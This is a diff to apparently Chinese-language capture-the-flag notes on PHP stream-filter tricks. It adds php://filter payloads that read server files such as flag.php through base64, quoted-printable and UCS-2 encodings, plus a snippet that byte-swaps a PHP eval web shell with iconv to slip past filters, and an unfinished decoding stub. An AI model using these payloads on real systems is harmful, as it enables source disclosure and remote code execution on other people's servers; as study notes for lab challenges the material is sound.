@@ -21,17 +21,25 @@ php://filter/read=convert.base64-encode/index/resource=flag
 ```
 其他编码方式
 ```
-
-
+quoted-printable-encode编码：
 file=php://filter/read=convert.quoted-printable-encode/resource=/var/www/html/flag.php
 
+
+UCS-2BE编码：
 file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=hack.php
 
+编码
 <?php
 $re = iconv("UCS-2LE","UCS-2BE", '<?php @eval($_GET[1]);?>');
 echo $re;
 ?>
 得?<hp pe@av(l_$EG[T]1;)>?
+
+
+解码：
+$encoded_string = // 这里应该是以 UCS-2LE 编码的原始字符串
+$decoded_string = iconv("UCS-2LE", "UCS-2BE", $encoded_string);
+echo $decoded_string;
 ```
 
 ^
